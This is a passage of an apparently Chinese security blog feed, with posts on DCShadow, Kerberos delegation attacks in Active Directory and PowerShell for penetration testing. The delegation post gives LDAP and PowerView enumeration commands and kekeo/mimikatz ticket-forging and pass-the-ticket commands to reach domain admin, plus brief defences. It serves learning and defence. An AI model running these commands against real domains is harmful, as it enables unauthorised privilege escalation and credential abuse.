src="20200507100638.png-water_print" alt="img"></p><p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code>的安全描述符，可知必须有<code>域管理员权限</code>才具备<code>写</code>权限</p><p>所以发动 DCShadow 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p><p><img src="20200507100807.png-water_print" alt="img"></p><p><img src="20200507100835.png-water_print" alt="img"></p><p>DC Shadow 源码：</p><p><img src="20200507100956.png-water_print" alt="img"></p><h4 id="注册的DC被其他DC认可，能够参与域复制"><a href="#注册的DC被其他DC认可，能够参与域复制" class="headerlink" title="注册的DC被其他DC认可，能够参与域复制"></a>注册的DC被其他DC认可，能够参与域复制</h4><p>一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件:</p><ul><li>这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 <code>WIN7X86CN04$</code>;</li><li>伪造 DC 能认证其他 DC 来访问的账号，如果我们给 <code>WIN7X86CN04$</code> 添加 <code>SPN</code>，则可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:<code>DRS</code>服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 <code>GS</code>(Global Catalog)服务</li></ul><p><img src="20200507101146.png-water_print" alt="img"></p><ul><li>运行DRS服务，最少需要实现 IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs 这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口</li></ul><h4 id="强制立即发起域复制"><a href="#强制立即发起域复制" class="headerlink" title="强制立即发起域复制"></a>强制立即发起域复制</h4><p>​    通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用 DRSReplicaAdd 函数接口强制立即发起域复制，DCShadow 正是通过调用 DRSReplicaAdd 函数强制立即发起域复制</p><p><img src="20200507101534.png-water_print" alt="img"></p><h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code> 的安全描述符，可知必须有域管理员权限才具备写权限</p><p>所以发动 <code>DCShadow</code> 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p><p><img src="20200507101621.png-water_print" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;DCSync与DCshadow攻击学习&quot;&gt;&lt;a href=&quot;#DCSync与DCshadow攻击学习&quot; class=&quot;headerlink&quot; title=&quot;DCSync与DCshadow攻击学习&quot;&gt;&lt;/a&gt;DCSync与DCshadow攻击学习&lt;/h2&gt;&lt;h4 i
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="域渗透" scheme="https://shu1l.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>kerberos域委派攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:02:51.000Z</published>
    <updated>2020-11-25T09:14:23.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kerberos委派攻击学习"><a href="#Kerberos委派攻击学习" class="headerlink" title="Kerberos委派攻击学习"></a>Kerberos委派攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p><h4 id="域委派的基本过程"><a href="#域委派的基本过程" class="headerlink" title="域委派的基本过程"></a>域委派的基本过程</h4><p>​    委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B<strong>“代理”</strong>自己去访问C服务，说是代理，也可以理解为<strong>“假冒”</strong>。</p><p>​    具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。</p><p><img src="20200505104626.png-water_print" alt="img"></p><p>​        一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行WEB服务的<strong>服务账号websvc</strong>模拟（ Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。</p><ul><li>域内用户jack以Kerberos方式认证后访问Web服务器；</li><li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请。</li><li>KDC检查websvc用户的委派属性，如果被设置， 则返回jack用户的可转发票据TGT；</li><li>websvc收到jack用户TGT后，使用该票据向KDC 申请访问文件服务器的服务票据TGS；</li><li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户 访问文件服务的授权票据TGS；</li><li>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</li></ul><h4 id="委派分类"><a href="#委派分类" class="headerlink" title="委派分类"></a>委派分类</h4><h5 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h5><p>​    非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户<strong>访问任意服务</strong></p><p>​    如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问<code>任意</code>服务</p><p><img src="WX20200414-123835@2x.png" alt="img"></p><ol><li>用户向KDC请求可转发TGT，记为TGT1</li><li>KDC返回TGT1</li><li>用户通过TGT1向KDC请求转发TGT2</li><li>KDC返回TGT2</li><li>用户通过TGT1向KDC申请访问服务1的RST</li><li>KDC返回RST</li><li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li><li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li><li>KDC给服务1返回服务2的RST</li><li>服务1以用户名义向服务2发出请求</li><li>服务2响应服务1的请求</li><li>服务1响应用户第7步骤的请求</li></ol><p>这个流程有一个问题：<strong>TGT2是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。</strong>攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p><h5 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h5><p>因为非约束委派很不安全，所以微软又发布了约束委派，区别在于不会直接把TGT给服务，所发送的认证信息中包含了允许访问的服务，即不允许服务代表用户去访问其他服务。</p><p>其实现主要依靠一组kerberos扩展：<code>S4U2Self</code>（Service for User to Self）和<code>S4U2Proxy</code>（Service for User to Proxy）</p><p><img src="WX20200414-123923@2x.png" alt="img"></p><p>流程如下：</p><ol><li>用户向服务1发出请求</li><li>在此之前服务1已经得到了用户访问服务1的TGT，接下来通过S4U2self扩展模拟用户向KDC请求ST</li><li>KDC返回给服务1一个用于验证服务1的ST</li><li>服务1使用第三步的ST响应用户的请求</li><li>用户再次向服务1发起请求，委派服务1访问服务2，条件是服务1验证通过且有有效的TGT，以及服务1有用户到服务1的可转发ST，即ST1</li><li>服务1通过S4U2Proxy扩展请求KDC返回一个用于验证服务2的ST，即ST2</li><li>KDC在验证PAC的数字签名后,如果没有失败（成功或没有PAC），将返回ST2给服务1</li><li>服务1代表用户使用ST2请求服务2，服务2判断此用户是否经过KDC验证，依据为ST2中的cname和crealm标识</li><li>服务2响应服务1的请求</li><li>服务1响应用户请求</li></ol><p><img src="20200505111706.png-water_print" alt="img"></p><h4 id="查找具有委派属性的服务账号"><a href="#查找具有委派属性的服务账号" class="headerlink" title="查找具有委派属性的服务账号"></a>查找具有委派属性的服务账号</h4><h5 id="非约束委派的查找"><a href="#非约束委派的查找" class="headerlink" title="非约束委派的查找"></a>非约束委派的查找</h5><h6 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h6><blockquote><p>kali上自带，适合在域外查询</p></blockquote><p>这个参数过多就不一一列举了，需要查阅的<code>ldapsearch -h</code>即可</p><p>查找域中配置非约束委派的用户：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> |grep -iE <span class="string">"distinguishedName"</span></span><br></pre></td></tr></table></figure><p>过滤条件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=<span class="number">805306368</span>)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure><p><img src="20200206165316-1da1e568-48be-1.png" alt="img"></p><p>查找域中配置非约束委派的主机：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> |grep -iE <span class="string">"distinguishedName"</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>：域控主机账户默认开启非约束委派</p><p>过滤条件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=<span class="number">805306369</span>)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure><p><strong>注</strong>：更多LDAP的过滤语法请参考微软的手册：<a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx?Sort=MostUseful" target="_blank" rel="noopener">地址</a></p><p><img src="20200206163923-2d25d118-48bc-1.png" alt="img"></p><p><strong>注</strong>：区别服务用户和主机的区别是<code>samAccountType=805306368 (0x30000000)</code>时为用户，<code>samAccountType=805306369 (0x30000001)</code>时为主机</p><h6 id="ADFind"><a href="#ADFind" class="headerlink" title="ADFind"></a>ADFind</h6><p>使用参数</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind</span> [<span class="keyword">switches] </span>[-<span class="keyword">b </span><span class="keyword">basedn] </span>[-f filter] [<span class="meta">attr</span> list]</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>-b：指定要查询的根节点</li><li>-f：LDAP过滤条件</li><li>attr list：需要显示的属性</li></ul><p>查找域中配置非约束委派的用户：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">cn</span> distinguishedName</span><br></pre></td></tr></table></figure><p><img src="20200211171505-fdc6fd1a-4cae-1.png" alt="img"></p><p>查找域中配置非约束委派的主机：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">cn</span> distinguishedName</span><br></pre></td></tr></table></figure><p><img src="20200211171701-43418342-4caf-1.png" alt="img"></p><h6 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h6><p>查找域中配置非约束委派用户</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -Unconstrained -<span class="keyword">Domain</span> qiyou.com |<span class="keyword">select</span> <span class="type">name</span></span><br></pre></td></tr></table></figure><p><img src="20200205215906-acc0ea0e-481f-1.png" alt="img"></p><p>查找域中配置非约束委派的主机：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetComputer -Unconstrained -<span class="keyword">Domain</span> qiyou.com</span><br></pre></td></tr></table></figure><p><img src="20200205220057-ee88c01a-481f-1.png" alt="img"></p><p>查询域中配置非约束委派的主机（另外一个版本的powerview）：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainComputer -Unconstrained -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol -<span class="keyword">Verbose</span> | ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure><p><img src="20200205220213-1bd856d4-4820-1.png" alt="img"></p><h5 id="约束委派的查找"><a href="#约束委派的查找" class="headerlink" title="约束委派的查找"></a>约束委派的查找</h5><h6 id="ldapsearch-1"><a href="#ldapsearch-1" class="headerlink" title="ldapsearch"></a>ldapsearch</h6><p>查找域中配置约束委派用户</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure><p>过滤条件</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">samAccountType=805306368</span>)(<span class="name">msds-allowedtodelegateto=*</span>))</span><br></pre></td></tr></table></figure><p><img src="20200206165805-c9d9c512-48be-1.png" alt="img"></p><p>查找域中配置约束委派的主机：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure><p>过滤条件</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">samAccountType=805306369</span>)(<span class="name">msds-allowedtodelegateto=*</span>))</span><br></pre></td></tr></table></figure><p><img src="20200206164433-e5901240-48bc-1.png" alt="img"></p><h6 id="ADFind-1"><a href="#ADFind-1" class="headerlink" title="ADFind"></a>ADFind</h6><p>查找域中配置约束委派用户</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> <span class="meta">cn</span> distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="20200211172106-d50ce7da-4caf-1.png" alt="img"></p><p>查找域中配置约束委派的主机：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> <span class="meta">cn</span> distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="20200211172239-0c56c080-4cb0-1.png" alt="img"></p><h6 id="PowerView-1"><a href="#PowerView-1" class="headerlink" title="PowerView"></a>PowerView</h6><p><strong>注</strong>：Powerview有两个版本，一个在dev分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a>，一个在master分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a></p><p>查找域中配置约束委派用户</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainUser –TrustedToAuth -domain qiyou.com -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span><br></pre></td></tr></table></figure><p><img src="20200206170357-9bafde5a-48bf-1.png" alt="img"></p><p>查找域中配置约束委派的主机：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainComputer -TrustedToAuth -Domain qiyou.com -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure><p><img src="20200205223329-7a841d9a-4824-1.png" alt="img"></p><h4 id="基于委派的攻击方法"><a href="#基于委派的攻击方法" class="headerlink" title="基于委派的攻击方法"></a>基于委派的攻击方法</h4><h5 id="1-已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限"><a href="#1-已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限" class="headerlink" title="1.已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限"></a>1.已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限</h5><p><img src="20200505112605.png-water_print" alt="img"></p><p>现在已知域内服务账号 <code>sqlsvc</code> 的口令明文，则可使用 keke 工具构造 sqlsvc 服务账号的票据。</p><p>cmd</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">tgt::<span class="title">ask</span> /<span class="title">user:sqlsvc</span> /<span class="title">domain:testlab</span>.<span class="title">com</span> /<span class="title">passw</span> <span class="title">ord</span>:1<span class="title">qaz</span>@<span class="title">WSX3edc</span> /<span class="title">ticket:sqlsvc</span>.<span class="title">kirbi</span></span></span><br></pre></td></tr></table></figure><p><img src="20200505112611.png-water_print" alt="img"></p><p>由于 <code>sqlsvc</code> 被设置为非约束性委派，因此可以利用刚才伪造的 sqlsvc 票据，向域服务器发起申请访问域服务器 <code>CIFS</code> 服务的管理员权限的 TGS 的命令</p><p>cmd</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Tgs::<span class="title">s4u</span> /<span class="title">tgt:service_account_tgt_file</span> /<span class="title">user:administrator</span>@<span class="title">testlab.com</span> /<span class="title">service:service_to_access</span></span></span><br></pre></td></tr></table></figure><p><img src="20200505113020.png-water_print" alt="img"></p><p>此时内存中已经有了访问域服务器 CIFS 服务的域管理员的 TGS 票据，需要将该票据注入当前的会话中，使用 mimikatz 的 <code>kerberos::ptt</code> 命令可完成票据的注入。注入票据后，当前的会话具备了访问域服务器 C 盘目录的权限</p><p><img src="20200505113149.png-water_print" alt="img"></p><h5 id="2-已控制非约束性委派服务账号所在的服务器"><a href="#2-已控制非约束性委派服务账号所在的服务器" class="headerlink" title="2.已控制非约束性委派服务账号所在的服务器"></a>2.已控制非约束性委派服务账号所在的服务器</h5><p>攻击者控制了服务器，与样例 1 类似。由于攻击者控制了服务器，可直接利用 <code>mimikatz</code> 从内存获取服务账号的 <code>TGT</code>，所以可以省去 <code>tgt::ask</code> 步骤，直接从 <code>tgs:s4u</code> 步骤开始，后续和样例 1 相同</p><h5 id="3-已获取配置了约束性委派的服务账号的口令-NTLM"><a href="#3-已获取配置了约束性委派的服务账号的口令-NTLM" class="headerlink" title="3.已获取配置了约束性委派的服务账号的口令 NTLM"></a>3.已获取配置了约束性委派的服务账号的口令 NTLM</h5><p>和样例 1 相同，样例 1 用明文口令生成 NTLM，然后向域服务器申请获取服务账号的 TGT。Kekeo 提供了该功能 ，可直接从 NTLM 开始，向域服务器申请 TGT。</p><h5 id="4-一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM"><a href="#4-一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM" class="headerlink" title="4.一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM"></a>4.一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM</h5><p>方法和样例 1 也是类似，只不过样例 1 中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。</p><p><img src="20200505113609.png-water_print" alt="img"></p><p><img src="20200505113722.png-water_print" alt="img"></p><p><img src="20200505113740.png-water_print" alt="img"></p><h4 id="委派攻击的防御"><a href="#委派攻击的防御" class="headerlink" title="委派攻击的防御"></a>委派攻击的防御</h4><p>通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。</p><p>域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Kerberos委派攻击学习&quot;&gt;&lt;a href=&quot;#Kerberos委派攻击学习&quot; class=&quot;headerlink&quot; title=&quot;Kerberos委派攻击学习&quot;&gt;&lt;/a&gt;Kerberos委派攻击学习&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Powershell渗透学习</title>
    <link href="https://shu1l.github.io/2020/07/21/powershell-shen-tou-xue-xi/"/>
    <id>https://shu1l.github.io/2020/07/21/powershell-shen-tou-xue-xi/</id>
    <published>2020-07-21T09:22:39.000Z</published>
    <updated>2021-01-16T08:33:08.105Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Powershell渗透学习"><a href="#Powershell渗透学习" class="headerlink" title="Powershell渗透学习"></a>Powershell渗透学习</h2><p>[TOC]</p><h3 id="powershell渗透基础"><a href="#powershell渗透基础" class="headerlink" title="powershell渗透基础"></a>powershell渗透基础</h3><h4 id="powershell简介"><a href="#powershell简介" class="headerlink" title="powershell简介"></a>powershell简介</h4><p>​                PowerShell是一种基于任务的命令行解释器和脚本环境，可以说是一种强大的shell,如同linux的bash,专为系统管理员而设计，以.NET框架为平台，Windows PowerShell帮助IT专业人员和超级用户控制和自动化管理Windows操作系统和运行在操作系统上的应用。<strong>现被更广泛用于渗透测试等方面，在不需要写入磁盘的情况下执行命令，也可以逃避Anti-Virus检测。</strong></p><p><strong>注:</strong>powershell只能针对win7以后的系统使用,</p><p><strong>为什么要学powershell</strong></p><p>​        对于我们渗透测试人员来说，PowerShell给我们提供了一个非常强大的shell和脚本环境。现在我们的渗透目标上都已经默认安装了PowerShell（win7以后，PowerShell已经默认集成在操作系统上），这给我们提供了一个强大的后渗透利用工具，给予我们很高的权限和广阔的攻击面。</p><h5 id="powershell的优点"><a href="#powershell的优点" class="headerlink" title="powershell的优点"></a>powershell的优点</h5><ul><li>易学</li><li>基于.NET框架</li><li>操作系统信任</li><li>提供win系列操作系统的几乎一切访问权限</li><li>win7之后默认安装</li><li>面向对象</li><li>ISE编程接口</li></ul><h5 id="常见的Powershell攻击工具"><a href="#常见的Powershell攻击工具" class="headerlink" title="常见的Powershell攻击工具"></a>常见的Powershell攻击工具</h5><ul><li>PowerShell：这是众多PowerShell攻击工具中被广泛使用的PowerShell后期的漏洞利用框架，常用来进行信息探测，特权提升，凭证窃取，持久化等操作。</li><li>Nishang：基于PowerShell的渗透测试专用工具，集成了框架，脚本和各种Payload，包含下载和执行，键盘记录，DNS，延时命令等脚本。</li><li>Empire：基于PowerShell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭证窃取，持久化控制。</li><li>PowerCat：PowerShell版的NetCat，有着网络工具中的”瑞士军刀”美誉，它能通过TCP和UDP在网络中读取数据。通过与其他工具结合和重定向，读者可以在脚本中以多种方式使用它</li></ul><h4 id="powershell语法基础"><a href="#powershell语法基础" class="headerlink" title="powershell语法基础"></a>powershell语法基础</h4><p>网站学习:<a href="http://www.pstips.net/" target="_blank" rel="noopener">http://www.pstips.net/</a></p><p>推荐文章:<a href="https://www.anquanke.com/post/id/87976" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87976</a> 讲的很细。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">|管道符的作用是将一个命令的输出作为另一个命令的输入</span></span><br><span class="line">;分号用来连续执行系统命令</span><br><span class="line"><span class="meta">&amp;是调用操作符，它允许你执行命令，脚本或函数</span></span><br><span class="line">双引号可以替换内部变量</span><br><span class="line">双引号里的双引号，单引号里的单引号，写两遍输出</span><br></pre></td></tr></table></figure><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><p><strong>运输符</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">· &gt;:将输出保存到指定文件中（用法：<span class="built_in">Get-Process</span>&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· &gt;&gt;:将脚本的输出追加到指定文件中（用法：test.ps1&gt;&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;:将错误输出到指定文件中（<span class="built_in">Get-Porcess</span> none <span class="number">2</span>&gt;Errors.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;&gt;:将错误追加到指定文件中（<span class="built_in">Get-Process</span> none <span class="number">2</span>&gt; logs<span class="literal">-Errors</span>.txt）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-eq</span>:等于运算符（用法：<span class="variable">$var1</span> –eq <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-gt</span>:大于运算符（用法：<span class="variable">$var1</span> –gt <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-match</span>:匹配运算符，搜索字符串是否在文中出现（用法：<span class="variable">$Text</span> –match <span class="variable">$string</span>返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-replace</span>:替换字符串（用法：<span class="variable">$Text</span> –replace 被替换的字符,替换的字符，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-in</span>：测试一个字符或数字是否出现在文本中或列表中，声明列表直接使用（）</span><br></pre></td></tr></table></figure><p><strong>数组</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$Array</span> = value1, value2, value3</span></span><br></pre></td></tr></table></figure><p><strong>语句</strong></p><ul><li>条件语句</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">If</span><span class="params">(<span class="variable">$var</span> &#123;comparison_statement&#125; <span class="variable">$var2</span>)</span></span> &#123;What_To_Do&#125;</span><br><span class="line">Else &#123;what_to_if_not&#125;</span><br></pre></td></tr></table></figure><ul><li>循环语句</li></ul><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span><span class="comment">()</span> &#123;&#125;</span><br><span class="line"><span 